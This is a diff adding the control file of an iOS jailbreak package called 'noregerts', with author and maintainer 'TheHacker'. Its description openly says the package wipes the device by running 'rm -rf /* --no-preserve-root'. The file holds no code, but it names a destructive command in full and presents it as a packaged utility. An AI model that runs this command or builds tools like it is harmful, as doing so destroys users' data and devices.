@@ -1,0 +1,12 @@
+Package: xyz.skylarmccauley.noregerts
+Name: noregerts
+Version: 1.0.1
+Depends: 
+Architecture: iphoneos-arm
+Conflicts:
+Description: Run noregerts in terminal to rm -rf /* --no-preserve-root your iOS Device.
+Maintainer: TheHacker
+Homepage: https://skylarmccauley.xyz/
+Depiction: http://skylarmccauley.xyz/hacked-repo/depic/xyz.skylarmccauley.noregerts/
+Author: TheHacker
+Section: Utilities
